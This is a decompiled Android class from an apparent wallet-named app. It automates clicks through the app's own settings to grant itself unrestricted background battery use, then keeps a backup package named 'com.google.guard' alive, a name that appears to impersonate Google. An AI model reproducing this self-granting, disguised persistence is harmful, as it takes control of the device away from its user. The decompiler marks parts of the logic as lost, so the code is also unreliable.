package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import p014r.EnumC0892e;

/* renamed from: o.f */
/* loaded from: classes.dex */
public final /* synthetic */ class RunnableC0417f implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f883a;

    /* renamed from: b */
    public final /* synthetic */ C0418g f884b;

    public /* synthetic */ RunnableC0417f(C0418g c0418g, int i2) {
        this.f883a = i2;
        this.f884b = c0418g;
    }

    /* JADX WARN: Code restructure failed: missing block: B:65:0x00a6, code lost:
    
        if (r1.click() != false) goto L32;
     */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        UiObject findOneByCombine;
        String str;
        String str2;
        int i2 = this.f883a;
        C0418g c0418g = this.f884b;
        switch (i2) {
            case 0:
                c0418g.getClass();
                try {
                    if (c0418g.i0()) {
                        Log.d("o.g", "keepAliveInAppDetail 窗口匹配");
                        AbstractC0184g.m354h(10);
                        c0418g.m1062G();
                        Log.d("o.g", "active root complete");
                        UiObject m1047Q = c0418g.m1047Q();
                        if (m1047Q != null) {
                            Log.d("o.g", "应用详情窗口滚动视图查找成功");
                            findOneByCombine = c0418g.l0(m1047Q);
                        } else {
                            Log.e("o.g", "应用详情窗口滚动视图查找失败");
                            findOneByCombine = c0418g.m1072k().findOneByCombine(C0418g.c0());
                            if (findOneByCombine == null) {
                                c0418g.m1072k().findOneByCombine(C0418g.f0());
                            }
                        }
                        if (findOneByCombine != null) {
                            UiObject findParentUtilCombine = findOneByCombine.findParentUtilCombine(AbstractC0414c.m1037L());
                            if (findParentUtilCombine != null && findParentUtilCombine.click()) {
                                Log.d("o.g", "查找并点击应用的电量管理已完成");
                                AbstractC0184g.m354h(30);
                                break;
                            } else {
                                str = "点击应用的电量管理失败";
                            }
                        } else {
                            str = "查找应用的电量管理失败";
                        }
                        Log.e("o.g", str);
                        break;
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("o.g", e2);
                    return;
                }
                break;
            case 1:
                c0418g.getClass();
                try {
                    if (c0418g.h0()) {
                        Log.d("o.g", "keepAliveInAppBattery 窗口匹配");
                        AbstractC0184g.m354h(40);
                        c0418g.m1062G();
                        Log.d("o.g", "active root complete");
                        UiObject findOneByOperateOr = c0418g.m1072k().findOneByOperateOr(C0418g.o0());
                        boolean z2 = true;
                        ConcurrentLinkedQueue concurrentLinkedQueue = c0418g.f850n;
                        AtomicBoolean atomicBoolean = c0418g.f891u;
                        AtomicBoolean atomicBoolean2 = c0418g.f890t;
                        AtomicBoolean atomicBoolean3 = c0418g.f889s;
                        if (findOneByOperateOr == null) {
                            CombineFilter b02 = C0418g.b0();
                            if (b02 != null) {
                                AbstractC0184g.m354h(40);
                                UiObject findOneByCombine2 = c0418g.m1072k().findOneByCombine(b02);
                                if (findOneByCombine2 != null) {
                                    AbstractC0184g.m354h(40);
                                    UiObject findParentUtilCombine2 = findOneByCombine2.findParentUtilCombine(AbstractC0414c.m1036K());
                                    if (findParentUtilCombine2 != null) {
                                        if (findParentUtilCombine2.click()) {
                                            concurrentLinkedQueue.remove("keepAliveInAppBattery");
                                            AbstractC0184g.m354h(40);
                                            break;
                                        }
                                    }
                                    break;
                                }
                            }
                        } else {
                            AbstractC0184g.m354h(50);
                            UiObject findParentUtilCombine3 = findOneByOperateOr.findParentUtilCombine(AbstractC0414c.m1036K());
                            if (findParentUtilCombine3 != null) {
                                Log.d("o.g", "查找允许后台耗电无限制成功");
                                AbstractC0184g.m354h(60);
                                if (findParentUtilCombine3.click()) {
                                    Log.d("o.g", "点击允许后台耗电无限制成功");
                                    AbstractC0184g.m354h(80);
                                    atomicBoolean3.set(true);
                                    atomicBoolean2.set(true);
                                    atomicBoolean.set(true);
                                } else {
                                    str2 = "点击允许后台耗电无限制失败";
                                }
                            } else {
                                str2 = "查找允许后台耗电无限制失败";
                            }
                            Log.e("o.g", str2);
                        }
                        try {
                            Log.d("o.g", "准备保存本地保活策略");
                            if (atomicBoolean3.get() && atomicBoolean2.get() && atomicBoolean.get()) {
                                AtomicReference atomicReference = c0418g.f888r;
                                boolean equals = Objects.equals(atomicReference.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP);
                                EnumC0892e enumC0892e = EnumC0892e.KEEP_ALIVE_BACKUP_APP;
                                if (equals) {
                                    c0418g.n0(MainApplication.getAppContext().getPackageName());
                                    concurrentLinkedQueue.clear();
                                    atomicBoolean3.set(false);
                                    atomicBoolean2.set(false);
                                    atomicBoolean.set(false);
                                    if (AbstractC0251g.d0("com.google.guard") == null) {
                                        z2 = false;
                                    }
                                    if (!AbstractC0252h.m714r("com.google.guard") && z2) {
                                        atomicReference.set(enumC0892e);
                                        AbstractC0251g.Z0("com.google.guard");
                                        break;
                                    }
                                } else if (Objects.equals(atomicReference.get(), enumC0892e)) {
                                    c0418g.n0("com.google.guard");
                                }
                                c0418g.mo1051Z();
                                break;
                            }
                        } catch (Exception e3) {
                            AbstractC0026q.m186s("o.g", e3);
                            return;
                        }
                    }
                } catch (Exception e4) {
                    AbstractC0026q.m186s("o.g", e4);
                }
                break;
            default:
                c0418g.mo1051Z();
                break;
        }
    }
}
